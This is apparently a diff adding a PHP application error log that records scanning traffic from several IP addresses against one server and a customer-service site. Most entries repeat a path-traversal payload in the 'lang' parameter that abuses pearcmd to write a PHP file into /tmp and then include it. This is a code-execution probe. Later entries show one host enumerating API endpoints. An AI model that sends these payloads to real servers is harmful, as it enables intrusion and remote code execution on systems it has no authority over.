@@ -1,0 +1,87 @@
+---------------------------------------------------------------
+[ 2024-06-13T03:52:13+08:00 ] 103.136.186.73 GET 47.129.4.65:443/index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5("hi"));?>+/tmp/index1.php
+[ error ] [8]未定义数组索引: code
+---------------------------------------------------------------
+[ 2024-06-13T03:52:13+08:00 ] 103.136.186.73 GET 47.129.4.65:443/index.php?lang=../../../../../../../../tmp/index1
+[ error ] [8]未定义数组索引: code
+---------------------------------------------------------------
+[ 2024-06-13T05:48:08+08:00 ] 180.103.103.19 GET 47.129.4.65:443/index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5("hi"));?>+/tmp/index1.php
+[ error ] [8]未定义数组索引: code
+---------------------------------------------------------------
+[ 2024-06-13T05:48:08+08:00 ] 180.103.103.19 GET 47.129.4.65:443/index.php?lang=../../../../../../../../tmp/index1
+[ error ] [8]未定义数组索引: code
+---------------------------------------------------------------
+[ 2024-06-13T06:13:13+08:00 ] 117.72.46.208 GET 47.129.4.65:443/index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5("hi"));?>+/tmp/index1.php
+[ error ] [8]未定义数组索引: code
+---------------------------------------------------------------
+[ 2024-06-13T06:13:15+08:00 ] 117.72.46.208 GET 47.129.4.65:443/index.php?lang=../../../../../../../../tmp/index1
+[ error ] [8]未定义数组索引: code
+---------------------------------------------------------------
+[ 2024-06-13T09:21:26+08:00 ] 113.250.189.251 GET 47.129.4.65:443/index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5("hi"));?>+/tmp/index1.php
+[ error ] [8]未定义数组索引: code
+---------------------------------------------------------------
+[ 2024-06-13T09:21:26+08:00 ] 113.250.189.251 GET 47.129.4.65:443/index.php?lang=../../../../../../../../tmp/index1
+[ error ] [8]未定义数组索引: code
+---------------------------------------------------------------
+[ 2024-06-13T15:17:34+08:00 ] 47.97.245.84 GET 47.129.4.65:443/index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5("hi"));?>+/tmp/index1.php
+[ error ] [8]未定义数组索引: code
+---------------------------------------------------------------
+[ 2024-06-13T15:17:34+08:00 ] 47.97.245.84 GET 47.129.4.65:443/index.php?lang=../../../../../../../../tmp/index1
+[ error ] [8]未定义数组索引: code
+---------------------------------------------------------------
+[ 2024-06-13T19:51:41+08:00 ] 101.36.123.78 GET kefu8sashjkahskjhakjsh.online/api/im/v2/app/config
+[ error ] controller not exists:app\api\controller\Im
+---------------------------------------------------------------
+[ 2024-06-13T19:51:41+08:00 ] 101.36.123.78 GET kefu8sashjkahskjhakjsh.online/api
+[ error ] controller not exists:app\api\controller\Index
+---------------------------------------------------------------
+[ 2024-06-13T19:51:41+08:00 ] 101.36.123.78 GET kefu8sashjkahskjhakjsh.online/api
+[ error ] controller not exists:app\api\controller\Index
+---------------------------------------------------------------
+[ 2024-06-13T19:51:41+08:00 ] 101.36.123.78 GET kefu8sashjkahskjhakjsh.online/mobile
+[ error ] [8]未定义数组索引: code
+---------------------------------------------------------------
+[ 2024-06-13T19:51:41+08:00 ] 101.36.123.78 GET kefu8sashjkahskjhakjsh.online/mobile/
+[ error ] [8]未定义数组索引: code
+---------------------------------------------------------------
+[ 2024-06-13T19:51:42+08:00 ] 101.36.123.78 GET kefu8sashjkahskjhakjsh.online/api/c/a
+[ error ] controller not exists:app\api\controller\C
+---------------------------------------------------------------
+[ 2024-06-13T19:51:42+08:00 ] 101.36.123.78 GET kefu8sashjkahskjhakjsh.online/api/ping
+[ error ] controller not exists:app\api\controller\Ping
+---------------------------------------------------------------
+[ 2024-06-13T19:51:42+08:00 ] 101.36.123.78 GET kefu8sashjkahskjhakjsh.online/api/linkPF
+[ error ] controller not exists:app\api\controller\Linkpf
+---------------------------------------------------------------
+[ 2024-06-13T19:51:42+08:00 ] 101.36.123.78 POST kefu8sashjkahskjhakjsh.online/api/notice
+[ error ] controller not exists:app\api\controller\Notice
+---------------------------------------------------------------
+[ 2024-06-13T19:51:42+08:00 ] 101.36.123.78 GET kefu8sashjkahskjhakjsh.online/api/config
+[ error ] controller not exists:app\api\controller\Config
+---------------------------------------------------------------
+[ 2024-06-13T19:51:42+08:00 ] 101.36.123.78 GET kefu8sashjkahskjhakjsh.online/api/version
+[ error ] controller not exists:app\api\controller\Version
+---------------------------------------------------------------
+[ 2024-06-13T19:51:42+08:00 ] 101.36.123.78 GET kefu8sashjkahskjhakjsh.online/api/v1/config
+[ error ] controller not exists:app\api\controller\V1
+---------------------------------------------------------------
+[ 2024-06-13T19:51:42+08:00 ] 101.36.123.78 GET kefu8sashjkahskjhakjsh.online/api/Business/
+[ error ] controller not exists:app\api\controller\Business
+---------------------------------------------------------------
+[ 2024-06-13T19:51:42+08:00 ] 101.36.123.78 GET kefu8sashjkahskjhakjsh.online/api/shop/getKF
+[ error ] controller not exists:app\api\controller\Shop
+---------------------------------------------------------------
+[ 2024-06-13T19:51:42+08:00 ] 101.36.123.78 GET kefu8sashjkahskjhakjsh.online/api/apps/config
+[ error ] controller not exists:app\api\controller\Apps
+---------------------------------------------------------------
+[ 2024-06-13T19:51:42+08:00 ] 101.36.123.78 POST kefu8sashjkahskjhakjsh.online/api/app/getinfo
+[ error ] controller not exists:app\api\controller\App
+---------------------------------------------------------------
+[ 2024-06-13T19:51:42+08:00 ] 101.36.123.78 GET kefu8sashjkahskjhakjsh.online/api/Event/basic
+[ error ] controller not exists:app\api\controller\Event
+---------------------------------------------------------------
+[ 2024-06-13T19:51:42+08:00 ] 101.36.123.78 GET kefu8sashjkahskjhakjsh.online/mobile/index/home
+[ error ] [8]未定义数组索引: visiter_id
+---------------------------------------------------------------
+[ 2024-06-13T19:51:42+08:00 ] 101.36.123.78 GET kefu8sashjkahskjhakjsh.online/api/app/indexList
+[ error ] controller not exists:app\api\controller\App
